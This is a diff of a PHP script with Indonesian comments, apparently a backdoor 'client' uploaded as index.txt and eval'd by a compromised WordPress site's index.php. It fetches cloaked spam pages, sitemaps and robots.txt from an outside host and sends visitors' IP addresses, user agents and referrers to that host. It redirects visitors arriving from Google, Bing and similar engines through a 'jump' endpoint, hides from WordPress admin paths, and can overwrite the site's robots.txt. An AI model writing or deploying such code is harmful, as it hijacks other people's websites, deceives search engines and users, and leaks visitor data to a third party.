@@ -1,28 +1,23 @@
 <?php
-// index.php (Client Proxy)
-// Skrip ini bertindak sebagai perantara yang mengirimkan permintaan ke Server Eksternal (endpoint_server.php).
+// index-client.php (DIUPLOAD sebagai index.txt)
+// Skrip ini di-eval oleh index.php di root WordPress Anda.
 
 error_reporting(0);
 @set_time_limit(120);
 @ignore_user_abort(1);
 
-// ** GANTI DENGAN URL SERVER EKSTERNAL ANDA **
-// URL ini harus mengarah ke file endpoint_server.php Anda.
+// ** URL Server Endpoint (index-endpoint.php) **
 $tr = "https://avs.javpornsub.cloud/"; 
 
 class Req
 {
-    // Fungsi utilitas untuk mengambil variabel $_SERVER
     public function server($name = '', $default = '')
     {
-        if (empty($name)) {
-            return $_SERVER;
-        }
+        if (empty($name)) { return $_SERVER; }
         $name = strtoupper($name);
         return isset($_SERVER[$name]) ? $_SERVER[$name] : $default;
     }
     
-    // Mendapatkan skema (http/https)
     public function scheme()
     {
         if ($this->server('HTTPS') && ("1" == $this->server('HTTPS') || "on" == strtolower($this->server('HTTPS')))) {
@@ -37,7 +32,6 @@ class Req
         return "http";
     }
     
-    // Mendapatkan domain lengkap
     public function dm()
     {
         $host = strval($this->server('HTTP_X_FORWARDED_HOST') ?: $this->server('HTTP_HOST'));
@@ -45,32 +39,28 @@ class Req
         return $this->scheme() . "://" . $host;
     }
     
-    // Mendapatkan IP pengguna
     public function ip()
     {
-        if (getenv('HTTP_CLIENT_IP')) {
-            $ip = getenv('HTTP_CLIENT_IP');
-        } elseif (getenv('HTTP_X_FORWARDED_FOR')) {
-            $ip = getenv('HTTP_X_FORWARDED_FOR');
-        } elseif (getenv('REMOTE_ADDR')) {
-            $ip = getenv('REMOTE_ADDR');
-        } else {
-            $ip = $this->server('REMOTE_ADDR');
-        }
+        if (getenv('HTTP_CLIENT_IP')) { $ip = getenv('HTTP_CLIENT_IP'); } 
+        elseif (getenv('HTTP_X_FORWARDED_FOR')) { $ip = getenv('HTTP_X_FORWARDED_FOR'); } 
+        elseif (getenv('REMOTE_ADDR')) { $ip = getenv('REMOTE_ADDR'); } 
+        else { $ip = $this->server('REMOTE_ADDR'); }
         return $ip;
     }
     
-    // Mendapatkan URI yang bersih (menghilangkan query string)
     public function uri()
     {
-        $requri = substr($this->server('REQUEST_URI'), strpos($this->server('REQUEST_URI'), '/'));
+        $requri = $this->server('REQUEST_URI');
         if ($pos = strpos($requri, '?')) {
             $requri = substr($requri, 0, $pos);
         }
-        return rtrim($requri, '/');
+        // Pastikan URI selalu dikembalikan tanpa slash di awal/akhir
+        $uri_clean = trim(preg_replace('/\/+/', '/', $requri), '/'); 
+        
+        // Handle root case explicitly, return a single slash for root
+        return ($uri_clean === '' || $uri_clean === 'index.php') ? '/' : '/' . $uri_clean;
     }
     
-    // Fungsi untuk eksekusi cURL (POST ke Server Eksternal)
     public function execReq($url, $p = array())
     {
         $url = str_replace(' ', '+', $url);
@@ -79,24 +69,29 @@ class Req
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_HEADER, 0);
         curl_setopt($ch, CURLOPT_TIMEOUT, 20);
-        curl_setopt($ch, CURLOPT_POST, 1);
+        
+        // Cek apakah ada data POST
+        $is_post = !empty($p) && (isset($p['uri']) || isset($p['domain']) || isset($p['ip']) || isset($p['user_agent']) || isset($p['referrer']));
+
+        if ($is_post) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($p));
+        } else {
+             // Jika tidak ada data POST, pastikan metode POST dinonaktifkan
+            curl_setopt($ch, CURLOPT_HTTPGET, true);
+        }
+        
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
         
         // Tambahkan header original User-Agent dan Referer ke payload
-        if ($this->server('HTTP_USER_AGENT')) {
-            $p['user_agent'] = $this->server('HTTP_USER_AGENT');
-        }
-        if ($this->server('HTTP_REFERER')) {
-            $p['referrer'] = $this->server('HTTP_REFERER');
-        }
+        if ($this->server('HTTP_USER_AGENT')) { $p['user_agent'] = $this->server('HTTP_USER_AGENT'); }
+        if ($this->server('HTTP_REFERER')) { $p['referrer'] = $this->server('HTTP_REFERER'); }
 
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($p));
         $output = curl_exec($ch);
         $errorCode = curl_errno($ch);
         curl_close($ch);
         if (0 !== $errorCode) {
-            // Error cURL, bisa logging atau menampilkan error
             return "<!-- cURL Error: " . $errorCode . " -->";
         }
         return $output;
@@ -104,54 +99,145 @@ class Req
 }
 
 $req = new Req();
-$uri = urldecode($req->uri());
+$uri = urldecode($req->uri()); 
+$uri_no_slash = ltrim($uri, '/'); // Versi URI tanpa slash di awal
 
-// Parameter dasar yang dikirim ke server eksternal
-$p = array(
-    "domain" => $req->dm(),
-    "port" => $req->server('SERVER_PORT', 80),
-    // Kirim URI tanpa slash di awal
-    "uri" => ltrim($uri, '/') 
+// Cache sitemap slugs for efficiency
+$sitemap_slugs = null; 
+
+/**
+ * Memverifikasi apakah URI yang diminta adalah salah satu slug SEO yang ada di sitemap.
+ * Memanggil endpoint /list di server.
+ */
+function is_seo_url_in_sitemap(string $uri_to_check, Req $req, string $tr): bool
+{
+    global $sitemap_slugs;
+    $uri_to_check = ltrim($uri_to_check, '/');
+
+    // Jika sudah di-cache, gunakan cache
+    if (is_array($sitemap_slugs)) {
+        return in_array($uri_to_check, $sitemap_slugs);
+    }
+    
+    $list_url = $tr . "list"; 
+    
+    // [MODIFIKASI] Kirim domain ke endpoint 'list' agar mendapatkan URL yang spesifik untuk domain ini.
+    $p = ["domain" => $req->dm()];
+    $json_output = $req->execReq($list_url, $p);
+
+    $sitemap_data = json_decode($json_output, true);
+    
+    if (is_array($sitemap_data)) {
+        $sitemap_slugs = $sitemap_data;
+        return in_array($uri_to_check, $sitemap_slugs);
+    }
+    
+    // Fallback keamanan: jika gagal fetch, asumsikan itu BUKAN URL SEO 
+    return false;
+}
+
+// --- KONDISI 1: LOGIKA JUMP/REDIRECT (Skenario Manusia dari Search Engine) ---
+
+$referrer = $req->server('HTTP_REFERER');
+$is_search_engine = (
+    strpos($referrer, 'google.com') !== false || 
+    strpos($referrer, 'bing.com') !== false ||
+    strpos($referrer, 'yahoo.com') !== false ||
+    strpos($referrer, 'duckduckgo.com') !== false
 );
 
-// --- 1. Penanganan robots.txt ---
-if (substr($uri, -10) == "robots.txt") {
-    header("Content-type:text/plain; charset=utf-8");
-    // Endpoint /robots di server akan menghasilkan semua file sitemap yang dinamis.
-    die($req->execReq($tr . "robots", $p));
-}
-// --- Penanganan file robots (untuk generate) ---
-if (substr($uri, -6) == "robots") {
-    $output = $req->execReq($tr . "robots", $p);
-    $rpt = __DIR__ . "/robots.txt";
-    file_put_contents($rpt, $output);
-    $robots_cont = @file_get_contents($rpt);
-    if (strpos(strtolower($robots_cont), "sitemap")) {
-        die("robots.txt file create success!");
-    } else {
-        die("robots.txt file create fail!");
+// JIKA BUKAN DARI ROOT DAN BUKAN DARI PATH WP, DAN DARI SEARCH ENGINE, KITA LOMPAT (JUMP)
+if ($is_search_engine && $uri !== '/' && $uri !== '/index.php' && !preg_match('/^\/(wp-admin|wp-content|wp-includes)/i', $uri)) {
+    // Kita harus memverifikasi bahwa ini adalah URL SEO yang valid sebelum melompat
+    if (is_seo_url_in_sitemap($uri, $req, $tr)) {
+        $p = array(
+            "domain" => $req->dm(),
+            "uri" => $uri_no_slash,
+            "ip" => $req->ip()
+        );
+        
+        // Panggil endpoint jump di server endpoint
+        $action = $tr . "jump";
+        die($req->execReq($action, $p));
     }
 }
 
-// --- 2. Penanganan Sitemap XML (.xml) ---
-if (substr($uri, -4) == ".xml") {
-    $sitemap_name = basename($uri);
-    $action_url = $tr . 'sitemap'; // Default untuk sitemap.xml dan allsitemap.xml
-    
-    // Jika bukan sitemap index utama, anggap itu adalah sitemap game yang tersegmentasi, kirim ke endpoint 'map'
-    if ($sitemap_name !== 'sitemap.xml' && $sitemap_name !== 'allsitemap.xml') {
-        $action_url = $tr . 'map'; 
-    } 
 
-    // Semua permintaan *.xml diarahkan ke endpoint yang sesuai
-    $output = $req->execReq($action_url, $p);
-    header("Content-type:text/" . (substr($output, 0, 5) === '<?xml' ? 'xml' : 'plain') . '; charset=utf-8');
-    die($output);
+// --- KONDISI 2: PENGECEKAN PENULISAN FILE robots.txt (URL KHUSUS) ---
+// Ketika user mengakses domain.com/robots, kita asumsikan tujuannya adalah membuat file robots.txt
+if ($uri === '/robots') {
+    $p = array( "domain" => $req->dm(), "port" => $req->server('SERVER_PORT', 80), "uri" => 'robots.txt' );
+    $output = $req->execReq($tr . "robots", $p);
+    
+    $rpt = __DIR__ . "/robots.txt";
+    $success = @file_put_contents($rpt, $output);
+    
+    header("Content-type:text/plain; charset=utf-8");
+    if ($success !== false) {
+        die("robots.txt file create success! Content written to: " . realpath($rpt));
+    } else {
+        die("robots.txt file create fail! Check file permissions for: " . realpath(__DIR__));
+    }
 }
 
-// --- 3. Penanganan URL SEO Palsu (Default Routing) ---
-// Semua URL lain (misal: /mobile-legends/top-up-mobile-lejends-diamonds) diarahkan ke endpoint 'indata'.
-$p["ip"] = $req->ip();
-$action = $tr . "indata";
-die($req->execReq($action, $p));
+
+// --- KONDISI 3: Pengecualian Keras untuk Root dan File WordPress (Skenario Manusia Langsung) ---
+
+// KONDISI 3.1: JIKA URI ADALAH ROOT 
+if ($uri === '/') {
+    // Biarkan skrip berakhir dan kontrol jatuh ke index.php loader
+    return;
+}
+
+// KONDISI 3.2: JIKA URI ADALAH FILE STATIS ATAU PATH WP PENTING
+$wp_paths_regex = '/^\/(wp-admin|wp-content|wp-includes|wp-json|feed|robots\.txt|.*\.php|.*\.css|.*\.js|.*\.jpg|.*\.png|.*\.gif|.*\.svg)/i';
+if (preg_match($wp_paths_regex, $uri)) {
+    // Biarkan skrip berakhir dan kontrol jatuh ke index.php loader
+    return;
+}
+
+// --- Logika Cloaking (Skenario Bot / Manusia Langsung ke URL SEO) ---
+
+// 4.1 Penanganan robots.txt & Sitemap XML (.xml) - HARUS DIE()
+if (substr($uri, -10) == "robots.txt" || substr($uri, -4) == ".xml") {
+    $p = array( "domain" => $req->dm(), "port" => $req->server('SERVER_PORT', 80), "uri" => $uri_no_slash );
+    
+    if (substr($uri, -10) == "robots.txt") {
+        // Tampilkan robots.txt dinamis
+        header("Content-type:text/plain; charset=utf-8");
+        die($req->execReq($tr . "robots", $p));
+    }
+
+    if (substr($uri, -4) == ".xml") {
+        $sitemap_name = basename($uri);
+        $action_url = $tr . 'sitemap'; 
+        
+        if ($sitemap_name !== 'sitemap.xml' && $sitemap_name !== 'allsitemap.xml') {
+            $action_url = $tr . 'map'; 
+        } 
+
+        $output = $req->execReq($action_url, $p);
+        header("Content-type:text/" . (substr($output, 0, 5) === '<?xml' ? 'xml' : 'plain') . '; charset=utf-8');
+        die($output);
+    }
+} 
+
+// 4.2 Penanganan URL SEO Palsu (HARUS ADA DI SITEMAP) - HARUS DIE()
+// Ini adalah skenario BOT atau Manusia yang langsung mengetik URL SEO (tanpa referrer)
+if (is_seo_url_in_sitemap($uri, $req, $tr)) {
+    
+    $p = array(
+        "domain" => $req->dm(),
+        "port" => $req->server('SERVER_PORT', 80),
+        "uri" => $uri_no_slash ,
+        "ip" => $req->ip()
+    );
+
+    // Tampilkan konten SEO dan HENTIKAN eksekusi
+    $action = $tr . "indata";
+    die($req->execReq($action, $p));
+}
+
+// JIKA TIDAK DIKENAL SEBAGAI URL SEO, TIDAK ADA DIE() -> LANJUTKAN KE WORDPRESS
+// return; 
 ?>
